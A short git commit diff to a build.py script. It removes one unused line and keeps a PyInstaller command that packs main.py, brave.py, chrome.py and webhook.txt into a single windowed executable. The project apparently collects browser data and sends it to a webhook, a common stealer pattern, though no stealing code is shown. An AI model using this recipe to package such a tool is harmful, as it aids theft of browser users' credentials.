c6695cdb0e927b1d79dac5de78b3286d30531301
CUPZYY <69486653+CUPZYY@users.noreply.github.com>
2021-04-28 08:37:17 +0200

    Update build.py

--- build.py
+++ build.py
@@ -1,6 +1,5 @@
 import pathlib
 import subprocess
 
-filePath = str(pathlib.Path(__file__).parent.absolute())
 
 subprocess.call("pyinstaller --noconfirm --onefile --windowed --add-data \"brave.py;.\" --add-data \"chrome.py;.\" --add-data \"webhook.txt;.\" --clean --hidden-import \"win32api\" \"main.py\"", shell=True)
